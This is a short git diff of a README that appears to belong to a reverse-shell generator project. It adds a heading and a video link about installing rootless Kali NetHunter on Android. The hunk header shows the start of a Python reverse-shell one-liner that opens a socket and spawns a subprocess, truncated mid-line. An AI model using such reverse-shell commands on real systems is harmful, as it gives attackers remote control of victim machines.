@@ -24,3 +24,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ![Screenshot 2024-06-08 015037](https://github.com/DevVj-1/Reverse-Shell-Generator/assets/106962581/13b0947b-d1bd-43af-bb1b-b9a2fc6063e2)
 
+## Setup rootless kali Nethunter on Android
+
+https://youtu.be/fqaSEbaYkJQ?si=b8u3mB2aq8Y4C9Hk
